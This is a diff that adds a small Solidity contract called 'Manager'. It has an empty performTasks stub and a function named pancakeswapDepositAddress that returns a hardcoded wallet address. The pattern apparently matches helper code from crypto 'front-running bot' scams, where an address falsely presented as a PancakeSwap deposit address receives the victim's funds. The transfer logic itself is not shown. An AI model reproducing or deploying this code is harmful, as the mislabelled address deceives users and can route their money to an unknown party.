@@ -1,0 +1,12 @@
+
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeswapDepositAddress() public pure returns (address) {
+		return 0x26947ffEeA0626E2cFf2Ae6aECC88ad23Db109e6;
+	}
+}
